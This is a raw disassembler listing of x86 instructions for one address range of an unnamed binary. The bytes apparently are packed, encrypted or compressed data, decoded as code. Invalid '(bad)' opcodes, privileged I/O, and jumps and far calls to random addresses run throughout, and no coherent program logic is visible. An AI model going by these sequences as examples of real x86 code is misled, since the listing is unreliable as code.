  405035:	sahf   
  405036:	sldt   WORD PTR [eax]
	...
  405049:	add    BYTE PTR [eax],al
  40504b:	add    BYTE PTR [edi+0x10b19caa],ch
  405051:	xchg   ebx,eax
  405052:	xor    DWORD PTR [ebx],0x87869309
  405058:	sub    bh,BYTE PTR [edx]
  40505a:	jle    0x404ff1
  40505c:	clc    
  40505d:	xor    DWORD PTR [ecx],eax
  40505f:	faddp  st(1),st
  405061:	inc    ecx
  405062:	jmp    0x66de6312
  405067:	xchg   ebp,eax
  405068:	cs jge 0x405020
  40506b:	xchg   esp,eax
  40506c:	fcom   DWORD PTR [edx-0x6c84a896]
  405072:	dec    esi
  405073:	xchg   ebp,eax
  405074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405075:	push   cs
  405076:	lods   al,BYTE PTR ds:[esi]
  405077:	add    BYTE PTR [edx],0x3a
  40507a:	ds xchg ebp,eax
  40507c:	mov    eax,0x25d7baed
  405081:	jge    0x405014
  405083:	xchg   esp,eax
  405084:	test   al,0x92
  405086:	in     eax,dx
  405087:	xchg   esp,eax
  405088:	pop    edx
  405089:	sub    ebx,DWORD PTR [esi]
  40508b:	xchg   ebp,eax
  40508c:	cwde   
  40508d:	xchg   edx,eax
  40508e:	pushf  
  40508f:	or     edi,DWORD PTR [edi+0x55]
  405092:	cmp    dl,BYTE PTR [ebp+0x3c548688]
  405098:	adc    BYTE PTR [edx-0x6df10002],0x0
  40509f:	mul    BYTE PTR [ecx+0x3648e7fa]
  4050a5:	xchg   edx,eax
  4050a6:	jmp    esi
  4050a8:	icebp  
  4050a9:	sub    bh,bh
  4050ab:	fidiv  WORD PTR [ebx]
  4050ad:	xchg   edx,eax
  4050ae:	mov    ch,0x3d
	...
  4050c4:	add    BYTE PTR [edx],bh
  4050c6:	xchg   edx,eax
  4050c7:	dec    esi
  4050c9:	cdq    
  4050ca:	cli    
  4050cb:	out    0x8b,eax
  4050cd:	not    DWORD PTR [ecx+0x1ca0d2ff]
  4050d3:	add    BYTE PTR [ebx-0x55],al
  4050d6:	xchg   ecx,eax
  4050d7:	jne    0x4050ba
  4050d9:	cld    
  4050da:	push   edi
  4050db:	shl    DWORD PTR [esi+0x35b5923b],cl
  4050e1:	xor    dl,BYTE PTR [edx-0x46c07e01]
  4050e7:	dec    DWORD PTR [esi-0x79a3a7cd]
  4050ed:	sbb    edx,DWORD PTR [edx-0x6db57618]
  4050f3:	inc    edx
  4050f5:	das    
  4050f6:	sbb    esi,DWORD PTR [edx-0x42]
  4050f9:	gs add ch,al
  4050fc:	ror    DWORD PTR [edx+eax*1+0x0],1
  405100:	jo     0x40515b
  405102:	fdivp  st(6),st
  405104:	push   esi
  405105:	cmp    eax,DWORD PTR [esi-0x6dcc0243]
  40510b:	(bad)  
  40510c:	jmp    0x9fa841c1
  405111:	ret    
  405112:	inc    edx
  405113:	add    BYTE PTR [esi],dh
  405115:	popa   
  405116:	fdivp  st(6),st
  405118:	adc    ebx,DWORD PTR cs:[ebx+0x2a4510d]
  40511f:	or     ebp,DWORD PTR [ecx]
  405121:	test   al,0xfc
  405123:	mov    WORD PTR [esp+esi*2-0x70],?
  405127:	dec    DWORD PTR [esi]
	...
  40513d:	add    dh,dl
  40513f:	xchg   ecx,eax
  405140:	rol    BYTE PTR [eax],1
  405142:	dec    ebp
  405143:	cli    
  405144:	fidiv  DWORD PTR [ebp-0x76]
  405147:	mov    BYTE PTR [ebp-0x8a86d0],al
  40514d:	push   eax
  40514e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40514f:	mov    eax,0xef4e00a7
  405154:	and    ecx,DWORD PTR [ebp-0x1493d]
  40515a:	jns    0x405132
  40515c:	(bad)  
  40515d:	jne    0x4051a5
  40515f:	ins    DWORD PTR es:[edi],dx
  405160:	inc    ebp
  405161:	shr    DWORD PTR [ecx+0x75],cl
  405164:	push   DWORD PTR [ebp-0x6]
  405167:	je     0x4051de
  405169:	or     BYTE PTR [esi+0x7f],ah
  40516c:	sar    edi,cl
  40516e:	stc    
  40516f:	aam    0x5a
  405171:	leave  
  405172:	dec    esp
  405173:	cli    
  405174:	call   DWORD PTR [ebp+edx*4+0x62]
  405178:	add    esp,0xffff6d26
  40517e:	imul   edi,DWORD PTR [ebx],0xfffffffc
  405181:	push   eax
  405182:	sub    ebx,ebp
  405184:	or     edi,edi
  405186:	xor    esi,ebp
  405188:	sub    BYTE PTR [ecx-0x2],al
  40518b:	ins    BYTE PTR es:[edi],dx
  40518c:	mov    edx,0xb04fea8
  405191:	rcr    cl,0x79
  405194:	out    0x0,eax
  405196:	into   
  405197:	add    al,0xc7
  405199:	inc    ebp
  40519a:	jbe    0x4051a2
  40519c:	add    BYTE PTR [eax],al
  40519e:	mov    esi,0xf445bb
	...
  4051b7:	imul   edi,ebp,0x4d4ffff
  4051bd:	push   0x0
  4051bf:	dec    ebx
  4051c0:	jnp    0x4051ae
  4051c2:	idiv   DWORD PTR [ecx+0x75]
  4051c5:	push   eax
  4051c6:	push   0xffffff8e
  4051c8:	add    DWORD PTR [ebp-0xc],0x5e
  4051cc:	add    DWORD PTR [ebp-0x6d0f580c],0xffffffff
  4051d3:	test   DWORD PTR [eax],0xf80f819
  4051d9:	(bad)
  4051dd:	add    al,0x0
  4051df:	pushf  
  4051e0:	fst    DWORD PTR [edi]
  4051e2:	add    eax,0x4477e
  4051e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051e8:	sbb    al,0x50
  4051ea:	in     al,dx
  4051eb:	push   eax
  4051ec:	mov    cl,0x92
  4051ee:	add    ebx,ebx
  4051f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051f1:	xchg   BYTE PTR [ebp-0x6d46c5],bh
  4051f7:	test   al,0xcd
  4051f9:	or     bh,bh
  4051fb:	loop   0x4051be
  4051fd:	sahf   
  4051fe:	mov    dh,0xbf
  405200:	mov    ss,ebx
  405202:	inc    eax
  405203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405204:	cs mov ah,dh
  405207:	sbb    BYTE PTR [ecx-0x6e],ch
  40520a:	push   eax
  40520b:	nop    DWORD PTR [ebx+0x0]
  40520f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405211:	ret    
  405212:	je     0x4051aa
  405214:	cs mov al,ch
  405217:	clc    
  405218:	mov    BYTE PTR [edx+0x50],dl
	...
  40522e:	add    BYTE PTR [eax],al
  405230:	sub    ah,BYTE PTR [edi]
  405232:	xchg   edi,eax
  405233:	div    eax
  405235:	sbb    BYTE PTR [ebx],dh
  405237:	push   DWORD PTR [edx-0x53]
  40523a:	xchg   edx,eax
  40523b:	xor    eax,0x44f257
  405240:	iret   
  405241:	xor    DWORD PTR [ebx-0x3c5b2f01],ebp
  405247:	je     0x4052bf
  405249:	and    cl,BYTE PTR [eax-0x6db74710]
  40524f:	push   0xbea299a6
  405254:	mov    al,0x4e
  405256:	sti    
  405257:	out    0x65,eax
  405259:	jmp    0x4051ec
  40525b:	jmp    DWORD PTR [edx+eax*1]
  40525e:	fs lahf 
  405260:	nop
  405261:	(bad)  
  405262:	push   ds
  405263:	add    al,0x1a
  405265:	inc    DWORD PTR [edx-0x1eea77fd]
  40526b:	fwait
  40526c:	shl    BYTE PTR [esi+eax*1-0x6d03736e],1
  405273:	add    al,0x70
  405275:	adc    eax,0xb4c49be1
  40527a:	out    dx,al
  40527b:	xchg   ecx,eax
  40527c:	pusha  
  40527d:	push   ebp
  40527e:	rcr    DWORD PTR [ecx+0x57de8f58],1
  405284:	push   edi
  405285:	xchg   edi,eax
  405286:	(bad)  
  405287:	xchg   ecx,eax
  405288:	dec    eax
  405289:	adc    eax,0xb4ea9be1
  40528e:	(bad)  
  40528f:	xchg   ecx,eax
  405290:	cmp    BYTE PTR [ebp-0x47],dl
  405293:	cdq    
	...
  4052a8:	add    BYTE PTR [eax],dh
  4052aa:	pop    ecx
  4052ac:	or     eax,0x91ae8f52
  4052b1:	push   0xffffff8a
  4052b3:	nop
  4052b4:	fcomp  QWORD PTR [ecx]
  4052b6:	(bad)  
  4052b7:	sahf   
  4052b8:	xchg   ecx,eax
  4052b9:	call   0xe902:0x40c7818e
  4052c0:	mov    edx,0x36e8f9e5
  4052c5:	sub    al,0x9e
  4052c7:	push   0x76970bc8
  4052cc:	xchg   ecx,eax
  4052cd:	sbb    al,BYTE PTR [ebp+0x6d]
  4052d0:	xor    al,0xe0
  4052d2:	adc    al,0xf5
  4052d4:	nop
  4052d5:	xchg   edx,eax
  4052d6:	adc    dl,BYTE PTR [eax]
  4052d8:	inc    ebx
  4052d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052da:	call   0xc3e2:0x2a76985
  4052e1:	mov    al,0x85
  4052e3:	call   0xaf47:0x2602a702
  4052ea:	add    DWORD PTR [eax],eax
  4052ec:	jmp    0xa5075595
  4052f1:	cmp    BYTE PTR [esi+0x18a4e907],cl
  4052f7:	add    BYTE PTR [ebx-0x7cffe75c],dl
  4052fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052fe:	jg     0x405345
  405300:	adc    eax,0xfd857fbb
  405305:	pop    ds
  405306:	mov    ?,edi
  405308:	cdq    
  405309:	pop    ss
  40530a:	sbb    al,bh
  40530c:	test   BYTE PTR [eax],0x0
	...
  40531f:	add    BYTE PTR [eax],al
  405321:	add    BYTE PTR [ecx-0x30901772],dl
  405327:	add    al,BYTE PTR [eax]
  405329:	repnz fs pop ss
  40532c:	add    eax,0x34ed0
  405331:	jmp    0x2868f6e2
  405336:	stos   DWORD PTR es:[edi],eax
  405337:	lea    esi,[ebp-0xb]
  40533a:	sbb    al,0x64
  40533c:	fdivr  DWORD PTR [esi-0x6674cce9]
  405342:	test   eax,0x37b6f487
  405347:	mov    ss,WORD PTR [eax+0x3b]
  40534a:	cmp    esi,DWORD PTR [eax+ebx*8-0x62]
  40534e:	aaa    
  40534f:	jl     0x4052d6
  405351:	cdq    
  405352:	das    
  405353:	mov    ?,edi
  405355:	or     DWORD PTR [edi-0x49],0x29a86ff
  40535c:	push   0x42d4df
  405361:	jbe    0x4053b4
  405363:	xchg   edx,eax
  405364:	imul   DWORD PTR [esi+0x37]
  405367:	mov    ?,WORD PTR ds:0x42fdd9
  40536d:	push   ecx
  40536e:	push   DWORD PTR [ebp-0x78b2a901]
  405374:	in     al,0x56
  405376:	pop    ss
  405377:	mov    gs,WORD PTR [edx+0x0]
  40537a:	into   
  40537b:	jmp    0x23f83a6
  405380:	push   DWORD PTR [ebp-0x9592]
	...
  40539a:	add    cl,dl
  40539c:	mov    ah,0x6f
  40539e:	sub    DWORD PTR [edi+0x1],ecx
  4053a1:	call   0xffb32d6f
  4053a6:	mov    ebx,edi
  4053a8:	ins    DWORD PTR es:[edi],dx
  4053a9:	idiv   edi
  4053ab:	mov    cl,0xef
  4053ad:	jmp    DWORD PTR [edi+0x3e]
  4053b0:	mov    cl,0x40
  4053b2:	add    BYTE PTR [ecx+0x37],dh
  4053b5:	lock div DWORD PTR [ecx+0x7d]
  4053b9:	push   DWORD PTR ds:0x40a8de
  4053bf:	jbe    0x4053ea
  4053c1:	xlat   BYTE PTR ds:[ebx]
  4053c2:	push   DWORD PTR [ecx+0xf]
  4053c5:	test   eax,ebp
  4053c7:	imul   edi,DWORD PTR [ebp-0x1],0xf75a3383
  4053ce:	jmp    DWORD PTR [ecx+0x6]
  4053d1:	je     0x40541c
  4053d3:	mov    ebp,0xf1f7ec33
  4053d8:	jl     0x4053da
  4053da:	je     0x4053aa
  4053dc:	cmp    DWORD PTR [ebp-0x82c618],0x67b5ba00
  4053e6:	add    dh,bh
  4053e8:	imul   edi,DWORD PTR [esi-0x18716401],0xffffffee
  4053ef:	push   ds
  4053f0:	jge    0x4053f1
  4053f2:	(bad)  
  4053f3:	mov    ebx,0x71fff762
  4053f8:	jge    0x40546f
  4053fa:	or     BYTE PTR [esi],ah
  4053fc:	inc    eax
  4053fd:	sar    edi,1
	...
  405413:	add    BYTE PTR [ecx+0x7d],al
  405416:	mov    ch,0xe8
  405418:	jns    0x405497
  40541a:	(bad)  
  40541b:	jmp    DWORD PTR [edi+0x7be7fbae]
  405421:	retf   0xff8e
  405424:	mov    eax,0xb0f7a80d
  405429:	retf   
  40542a:	mov    ?,WORD PTR [ebp-0x61]
  40542d:	inc    ebx
  40542e:	out    0xd0,al
  405430:	mov    al,ds:0x83b58edd
  405435:	in     eax,dx
  405436:	mov    ?,edi
  405438:	jg     0x4053e4
  40543a:	mov    bh,0xff
  40543c:	mov    ch,dh
  40543e:	pop    eax
  40543f:	in     al,dx
  405440:	js     0x40543f
  405442:	mov    gs,eax
  405444:	ret    0x8eed
  405447:	push   DWORD PTR [eax-0x29]
  40544a:	fwait
  40544b:	imul   DWORD PTR [eax-0x6b]
  40544e:	fwait
  40544f:	sbb    bh,BYTE PTR [ebx-0x63]
  405452:	mov    ?,edi
  405454:	adc    ch,BYTE PTR [edx-0x52af006a]
  40545a:	sbb    BYTE PTR [eax],cl
  40545c:	aas    
  40545d:	jg     0x4053ec
  40545f:	inc    DWORD PTR [eax-0x43]
  405462:	pop    eax
  405463:	lock xor ch,al
  405466:	mov    gs,eax
  405468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405469:	jne    0x4053f9
  40546b:	jmp    FWORD PTR [eax]
  40546d:	fisttp WORD PTR [ebx-0x71a39c17]
  405473:	call   FWORD PTR [eax]
  405475:	out    dx,eax
  405476:	(bad)
	...
  40548a:	add    BYTE PTR [eax],al
  40548c:	add    BYTE PTR [ebx+eax*2+0x3],bl
  405490:	add    dh,bl
  405492:	push   edi
  405493:	sti    
  405494:	call   FWORD PTR [ebx+0x20]
  405497:	lahf   
  405498:	and    ebx,0xffffff85
  40549b:	sbb    DWORD PTR [eax],eax
  40549d:	jge    0x405439
  40549f:	mov    ?,WORD PTR [ebp-0x61]
  4054a2:	xor    edx,0x7c1ce0d0
  4054a8:	inc    ebp
  4054a9:	fild   DWORD PTR [edx]
  4054ab:	sar    DWORD PTR [ebp-0x80],1
  4054ae:	inc    ecx
  4054af:	jmp    0x413aa742
  4054b4:	daa    
  4054b5:	ror    DWORD PTR [ebx-0x23f5e4b2],0xa7
  4054bc:	add    esi,DWORD PTR [eax+0x509bf115]
  4054c2:	mov    WORD PTR [esi],?
  4054c4:	mov    cs,WORD PTR [edi]
  4054c6:	mov    esi,0x8ba744fe
  4054cb:	pushf  
  4054cc:	sti    
  4054cd:	mov    dh,cl
  4054cf:	sbb    ecx,DWORD PTR [esi-0x21e3e578]
  4054d5:	out    0x2,eax
  4054d7:	push   cs
  4054d8:	sbb    BYTE PTR [edi+0x7090d69a],ch
  4054de:	mov    edi,esi
  4054e0:	pop    ss
  4054e1:	imul   ecx,DWORD PTR [ebx-0xcb70484],0x17
  4054e8:	mov    ds,WORD PTR [eax-0x47]
  4054eb:	stos   DWORD PTR es:[edi],eax
  4054ec:	or     BYTE PTR [edi+0xa07235],ah
	...
  405506:	mov    edi,0x19ce902
  40550b:	mov    edx,DWORD PTR [eax+eax*1+0x38]
  40550f:	adc    eax,0x95c39bf1
  405514:	mov    esi,0xe1c05e8d
  405519:	add    edi,DWORD PTR [edx+0x77]
  40551c:	mov    ebp,0xe8fe9a81
  405521:	cld    
  405522:	and    al,0xe0
  405524:	out    0x3,eax
  405526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405527:	mov    ebx,DWORD PTR [eax+eax*1]
  40552a:	movaps xmm5,XMMWORD PTR [edi-0x57090773]
  405531:	pop    ss
  405532:	xchg   edi,eax
  405533:	sbb    cl,BYTE PTR [eax+0x267dc]
  405539:	jbe    0x4054f3
  40553b:	(bad)  
  40553c:	out    0x22,eax
  40553e:	adc    cl,BYTE PTR [ebx-0x1978f01]
  405544:	imul   ebp,ecx,0xa83028ac
  40554a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40554b:	sbb    ah,BYTE PTR [ebp+0x19]
  40554e:	fs add bh,bh
  405551:	cld    
  405552:	xchg   esp,eax
  405553:	fld    DWORD PTR [eax-0x17]
  405556:	or     al,0x34
  405558:	(bad)  
  405559:	ss xor bh,dh
  40555c:	mov    edi,0x503a8ab5
  405561:	es mov eax,0x512ee7f6
  405567:	mov    bh,bh
  405569:	mov    ecx,0x0
	...
  40557e:	add    BYTE PTR [ecx+ecx*4+0x741ce175],dh
  405585:	inc    DWORD PTR [esi]
  405587:	and    bl,BYTE PTR [ebx-0x75e5e5df]
  40558d:	call   0xffca6d67
  405592:	and    DWORD PTR [edx+ebx*1+0x2e4195a],0x68
  40559a:	inc    esp
  40559b:	jae    0x4055e0
  40559d:	add    BYTE PTR [ecx-0x5b],al
  4055a0:	add    al,BYTE PTR [eax]
  4055a2:	imul   ebx,DWORD PTR [ecx+ebp*8],0xfe23c6d5
  4055a9:	mov    edi,0x503a3935
  4055ae:	mov    dh,0xb9
  4055b0:	mul    bh
  4055b2:	push   esi
  4055b3:	push   edx
  4055b4:	mov    bh,bh
  4055b6:	cmp    ebx,ebx
  4055b8:	mov    DWORD PTR [ebp-0xf],esi
  4055bb:	sub    al,0x2c
  4055bd:	call   DWORD PTR [esi-0x441664cd]
  4055c3:	sub    ecx,DWORD PTR [edx+0x542200e8]
  4055c9:	(bad)  
  4055ca:	call   DWORD PTR [esi+edi*8+0x451e5a67]
  4055d1:	add    BYTE PTR [eax+0x46],ch
  4055d4:	mov    ch,0x40
  4055d6:	add    BYTE PTR [ecx-0x50],cl
  4055d9:	outs   dx,DWORD PTR ds:[esi]
  4055da:	sub    edi,edi
  4055dc:	add    eax,0x7683e5e8
  4055e1:	dec    DWORD PTR [ebx]
	...
  4055f7:	add    BYTE PTR [esi+0xe501df1],cl
  4055fd:	ja     0x405674
  4055ff:	or     al,0x56
  405601:	xlat   BYTE PTR ds:[ebx]
  405602:	aad    0xff
  405604:	(bad)  
  405606:	dec    edi
  405607:	call   DWORD PTR [ebx-0x73]
  40560a:	out    0x20,eax
  40560c:	leave  
  40560d:	jbe    0x40560e
  40560f:	call   0x3faa02
  405614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405615:	sub    dl,dl
  405617:	jmp    FWORD PTR [ecx+0x4467ffeb]
  40561d:	mov    ch,0x40
  40561f:	add    BYTE PTR [esi],dl
  405621:	or     eax,0xed4e4130
  405626:	add    DWORD PTR [eax],eax
  405628:	dec    esi
  405629:	test   eax,ebp
  40562b:	lods   eax,DWORD PTR ds:[esi]
  40562c:	adc    edi,DWORD PTR [ebp-0x1]
  40562f:	or     edi,esi
  405631:	icebp  
  405632:	sbb    eax,0x757d7e50
  405637:	or     al,0x66
  405639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40563a:	aad    0xff
  40563c:	imul   ecx,esi,0x8673ff4f
  405642:	out    0xe8,eax
  405644:	pop    eax
  405645:	jge    0x405646
  405647:	call   0x3fa722
  40564c:	ss icebp 
  40564e:	sar    edi,1
  405650:	sub    esi,esp
  405652:	cmp    DWORD PTR [eax],esi
  405654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405655:	fiadd  DWORD PTR [ebx]
  405657:	push   DWORD PTR [edx-0x59]
  40565a:	fwait
  40565b:	add    eax,0x0
	...
  405670:	add    cl,bl
  405672:	jg     0x4055ff
  405674:	push   eax
  405675:	push   edi
  405676:	or     BYTE PTR [ecx],dl
  405678:	or     bh,cl
  40567a:	push   edi
  40567b:	mov    bh,bh
  40567d:	fadd   DWORD PTR [edx+0x1fd0d233]
  405683:	mov    esi,DWORD PTR [ebp-0x65]
  405686:	xor    edi,DWORD PTR [ebx]
  405688:	rol    al,cl
  40568a:	das    
  40568b:	mov    ebp,0x309bafc2
  405690:	mov    eax,ebx
  405692:	sbb    eax,eax
  405694:	hlt    
  405695:	cmp    eax,0xa0021d9b
  40569a:	inc    edi
  40569b:	sti    
  40569c:	out    0x16,eax
  40569e:	jmp    0x575f562d
  4056a3:	xchg   DWORD PTR [eax-0x5e],ebp
  4056a6:	call   0xffb5:0x5d8f0003
  4056ad:	js     0x4056d2
  4056af:	inc    ecx
  4056b0:	clc    
  4056b1:	call   DWORD PTR [ebp-0x7758fffc]
  4056b7:	adc    al,bh
  4056b9:	dec    edi
  4056ba:	loop   0x405722
  4056bc:	add    BYTE PTR [edi-0x448b3c5c],ah
  4056c2:	fdivp  st(7),st
  4056c4:	add    BYTE PTR [edi+0x400d1299],ah
  4056ca:	daa    
  4056cb:	mov    edi,?
  4056cd:	mov    dl,0xa1
  4056cf:	fwait
  4056d0:	mov    BYTE PTR [ecx],dh
  4056d2:	ror    DWORD PTR [edx+0xeb],0x0
	...
  4056e9:	add    BYTE PTR [edi+0xff81048],bl
  4056ef:	dec    esi
  4056f0:	mov    ah,0xff
  4056f2:	sbb    BYTE PTR [esp+ebx*8-0x19],al
  4056f6:	imul   eax,DWORD PTR [edx],0xffffffbf
  4056f9:	mov    cl,BYTE PTR [eax]
  4056fb:	xor    ebx,DWORD PTR [esi+0x79aaf10]
  405701:	mov    bh,al
  405703:	xchg   DWORD PTR [ebx],eax
  405705:	out    dx,al
  405706:	or     bh,cl
  405708:	sahf   
  405709:	mov    ch,al
  40570b:	sti    
  40570c:	test   al,0xf
  40570e:	mov    ebx,0x67d42f1a
  405713:	add    bl,BYTE PTR [ecx]
  405715:	pushf  
  405716:	fisubr WORD PTR [ebp-0x7888759a]
  40571c:	aam    0xfb
  40571e:	enter  0x5737,0x8a
  405722:	mov    eax,0x9a9c0a1c
  405727:	mov    al,0x46
  405729:	mov    bl,BYTE PTR [edx+eax*8+0x4108efb5]
  405730:	stc    
  405731:	inc    esp
  405732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405733:	xor    al,BYTE PTR [ecx+0x5d]
  405736:	jp     0x4056bf
  405738:	xor    ecx,DWORD PTR es:[eax-0x48640ef3]
  40573f:	mov    BYTE PTR [esi],dl
  405741:	mov    cl,BYTE PTR ds:0x5a9100e7
  405747:	xchg   DWORD PTR [esi],eax
  405749:	(bad)  
  40574a:	sub    BYTE PTR [esi],cl
  40574c:	aad    0x1b
	...
  405762:	add    cl,ch
  405764:	shl    BYTE PTR [edi+0x629af703],cl
  40576a:	mov    al,0x50
  40576c:	xchg   DWORD PTR [ecx],edi
  40576e:	mov    edx,edx
  405770:	cli    
  405771:	shl    bl,1
  405773:	inc    edx
  405774:	xchg   esi,edx
  405776:	push   ds
  405777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405778:	sbb    bl,BYTE PTR [esi]
  40577a:	aam    0xe7
  40577c:	add    dl,BYTE PTR [ecx+0x1f]
  40577f:	ja     0x4057c2
  405781:	jmp    0x53320e
  405786:	add    BYTE PTR [edx+eax*1-0x18],ah
  40578a:	pop    ecx
  40578b:	push   edi
  40578c:	xchg   edi,edi
  40578e:	cmp    DWORD PTR [esi],ebx
  405790:	or     eax,0x85149108
  405795:	call   DWORD PTR [esi+0x33680299]
  40579b:	fild   DWORD PTR [ecx+0x0]
  40579e:	adc    DWORD PTR [eax+0x2fe940d2],ecx
  4057a4:	int    0x6f
  4057a6:	shl    BYTE PTR [ebp+0x2],0xe8
  4057aa:	stc    
  4057ab:	add    BYTE PTR [edi+0xde4f2ff],al
  4057b1:	push   ss
  4057b2:	jo     0x405734
  4057b4:	mov    ?,edi
  4057b6:	fsubr  QWORD PTR [eax]
  4057b8:	xchg   DWORD PTR [ebp-0x1f],esi
  4057bb:	or     al,0x51
  4057bd:	std    
  4057be:	inc    esi
  4057bf:	push   ds
  4057c0:	xchg   DWORD PTR [ebp+0x35],esi
  4057c3:	inc    ebx
  4057c4:	(bad)
	...
  4057db:	add    BYTE PTR [esi],ch
  4057dd:	sbb    DWORD PTR [eax],eax
  4057df:	ror    edi,0xd2
  4057e2:	inc    eax
  4057e3:	jmp    0xa870d294
  4057e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057e9:	test   DWORD PTR ds:0x435d99,esi
  4057ef:	add    DWORD PTR [esi-0x4e],ebx
  4057f2:	inc    DWORD PTR [esi]
  4057f4:	mov    bl,0x85
  4057f6:	jne    0x4057e9
  4057f8:	cmp    al,0x63
  4057fa:	std    
  4057fb:	imul   BYTE PTR [edi]
  4057fd:	sbb    DWORD PTR [eax],eax
  4057ff:	add    DWORD PTR [edx-0x5316bf2e],0xab28307a
  405809:	test   DWORD PTR ds:0x435c59,esi
  40580f:	sar    DWORD PTR [edi],0xb2
  405812:	inc    DWORD PTR [eax]
  405814:	popa   
  405815:	xchg   DWORD PTR [edi+0x4508f874],edi
  40581b:	hlt    
  40581c:	push   ecx
  40581d:	cmc    
  40581e:	repz (bad) 
  405820:	fild   DWORD PTR [esi+0x7b4360e7]
  405826:	(bad)  
  405827:	call   FWORD PTR [ebx+0x3eede872]
  40582d:	jnp    0x40582e
  40582f:	push   0xfffffffe
  405831:	jmp    0xfeff8884
  405836:	addr16 gs push ds
  405839:	inc    ecx
  40583a:	add    BYTE PTR [eax-0x34],ch
  40583d:	add    DWORD PTR [eax],eax
  40583f:	add    BYTE PTR [eax],0x0
	...
  405852:	add    BYTE PTR [eax],al
  405854:	add    BYTE PTR [esi],ah
  405856:	imul   edx,ebx,0xffffffff
  405859:	inc    ecx
  40585a:	sar    esi,1
  40585c:	jne    0x405814
  40585e:	imul   edx,DWORD PTR [eax-0x3],0x6a7a51
  405865:	out    0xd7,al
  405867:	das    
  405868:	inc    ecx
  405869:	mov    esi,0x4f3064e9
  40586e:	add    DWORD PTR [eax+0x2],ebp
  405871:	mov    es,WORD PTR [ecx]
  405873:	sub    al,0xae
  405876:	dec    esi
  405877:	(bad)  
  405878:	call   DWORD PTR [ebp-0x8e98b3f]
  40587e:	(bad)  
  40587f:	repz call FWORD PTR [ebx]
  405882:	jne    0x405883
  405884:	jne    0x40580c
  405886:	imul   edx,DWORD PTR [ecx],0xff7aa1fd
  40588c:	jne    0x4058e8
  40588e:	push   0x7d51d09e
  405893:	push   0x0
  405895:	es retf 0x412f
  405899:	ds jmp 0xfecf8926
  40589f:	add    ah,BYTE PTR [bx+0x39b]
  4058a4:	cmp    BYTE PTR [edi],0x7b
  4058a7:	mov    bl,0xff
  4058a9:	sub    bl,ch
  4058ab:	xchg   BYTE PTR [ebp-0x51],dh
  4058ae:	mov    bl,0x5
  4058b0:	std    
  4058b1:	sbb    BYTE PTR [edx+ebx*1+0x0],cl
  4058b5:	jg     0x4058a8
  4058b7:	rol    DWORD PTR [eax+0x0],cl
	...
  4058ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058cf:	repz jnp 0x405902
  4058d2:	data16 fwait
  4058d4:	sbb    eax,DWORD PTR [edx]
  4058d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058d7:	fwait
  4058d8:	sub    eax,0x26
  4058db:	dec    eax
  4058dc:	xchg   edi,edi
  4058de:	pushf  
  4058df:	pop    ebx
  4058e0:	adc    BYTE PTR [esi],dl
  4058e2:	fimul  WORD PTR cs:[edi-0x78f8ad01]
  4058e9:	jne    0x40588a
  4058eb:	add    edx,0xfffffffc
  4058ee:	enter  0x871b,0x75
  4058f2:	mov    ebx,0xb8d03732
  4058f7:	sub    eax,DWORD PTR [edi+0x1133b375]
  4058fd:	or     BYTE PTR [edi-0x5f004728],bh
  405903:	rol    ecx,cl
  405905:	add    al,0xa7
  405907:	data16 jp 0x4058f6
  40590a:	call   FWORD PTR [ecx-0x22b610fd]
  405910:	adc    BYTE PTR [eax+eax*4],cl
  405913:	outs   dx,DWORD PTR ds:[esi]
  405914:	sti    
  405915:	out    0x90,eax
  405917:	out    0x86,eax
  405919:	call   FWORD PTR [esi-0x28]
  40591c:	sti    
  40591d:	call   ebx
  40591f:	adc    BYTE PTR [eax-0x7a31947f],bl
  405925:	call   FWORD PTR [eax-0x2b]
  405928:	cmp    BYTE PTR [eax+0x869551],0xa7
  40592f:	add    ch,cl
  405931:	add    eax,DWORD PTR [eax]
	...
  405947:	sub    al,0x3e
  405949:	in     eax,dx
  40594a:	cli    
  40594b:	clc    
  40594c:	push   cs
  40594d:	in     al,dx
  40594e:	sub    DWORD PTR [edi+0x2],0x54
  405952:	add    DWORD PTR [esi],edi
  405954:	sub    ch,al
  405956:	add    esp,DWORD PTR [edi+0xf83483]
  40595c:	xchg   ebp,eax
  40595d:	xchg   ebx,eax
  40595e:	xchg   BYTE PTR [eax],dl
  405960:	clc    
  405961:	test   al,0x10
  405963:	cwde   
  405964:	sbb    bh,BYTE PTR [ebx-0x61fd9829]
  40596a:	adc    BYTE PTR [ebx-0xf4d9d66],ch
  405970:	add    DWORD PTR [edx-0x2a547f08],0x44
  405977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405978:	xor    esp,0xfffffff7
  40597b:	rol    BYTE PTR [esi],0x9a
  40597e:	xchg   al,dl
  405980:	jns    0x4059e6
  405982:	dec    ebx
  405983:	leave  
  405984:	and    DWORD PTR [esi+0x1b],0xffffff81
  405988:	add    ecx,ebp
  40598a:	add    ebp,DWORD PTR [edx]
  40598c:	jle    0x4059b9
  40598e:	test   DWORD PTR [eax-0x4c64467d],esi
  405994:	mov    bl,0x46
  405996:	xchg   BYTE PTR [edx],dh
  405998:	jge    0x4059c5
  40599a:	test   DWORD PTR [eax+0x5a869983],ebx
  4059a0:	dec    edx
  4059a1:	das    
  4059a2:	xchg   BYTE PTR [eax-0x589b2666],cl
  4059a8:	add    dh,BYTE PTR [eax-0x80]
	...
  4059bf:	add    BYTE PTR [ebx],bh
